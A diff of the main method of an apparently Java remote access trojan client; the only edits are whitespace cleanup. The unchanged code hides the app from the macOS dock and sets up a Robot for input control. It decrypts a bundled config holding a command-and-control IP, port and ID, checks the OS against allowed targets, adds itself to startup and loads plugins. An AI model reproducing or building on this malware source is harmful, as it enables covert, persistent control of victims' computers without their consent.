@@ -40,28 +40,24 @@ public class Main {
 	public static boolean encryption = true;
 
 	public static void main(String[] args) {
-		try {		
+		try {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 				System.setProperty("apple.awt.UIElement", "true");
 			}
 
 			robot = new Robot();
-			
+
 			encryptionKey = Util.readString(Main.class.getResourceAsStream("/key.dat")).trim();
-			
+
 			InputStream configFileInputStream = Main.class.getResourceAsStream("/config.dat");
 			byte[] configBuffer = new byte[configFileInputStream.available()];
 			configFileInputStream.read(configBuffer);
 			String rawConfigFile = new String(Crypto.decrypt(configBuffer, Main.getKey()));
-			
-			File filetodelete = null;
 
-			
+			File filetodelete = null;
 
 			config = new HashMap<String, String>();
 
-			
-			
 			String[] configr = rawConfigFile.trim().split("SPLIT");
 
 			for (int i = 0; i < configr.length; i++) {
@@ -72,7 +68,7 @@ public class Main {
 
 				config.put(ckey, cval);
 			}
-			
+
 			ip = config.get("ip");
 			port = Integer.parseInt(config.get("port"));
 			id = config.get("id");
@@ -85,11 +81,11 @@ public class Main {
 			if (Boolean.parseBoolean(config.get("mutex"))) {
 				new Mutex(Integer.parseInt(config.get("mport"))).start();
 			}
-			
+
 			String allowedOperatingSystems = config.get("os");
-			
+
 			boolean shutdown = true;
-			
+
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && allowedOperatingSystems.contains("win")) {
 				shutdown = false;
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX && allowedOperatingSystems.contains("mac")) {
@@ -122,13 +118,13 @@ public class Main {
 			}
 
 			String currentJar = Util.getJarFile().getAbsolutePath();
-			
+
 			try {
 				Startup.addToStartup(name);
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-			
+
 			if (filetodelete != null) {
 				while (filetodelete.exists()) {
 					try {
@@ -145,13 +141,13 @@ public class Main {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
 				currentJar = currentJar.substring(1, currentJar.length());
 			}
-			
+
 			File f = new File(currentJar);
 			if (f.exists()) {
 				Date da = new Date(f.lastModified());
 				Main.date = da.toString();
 			}
-			
+
 			try {
 				Plugin.load();
 			} catch (Exception e1) {
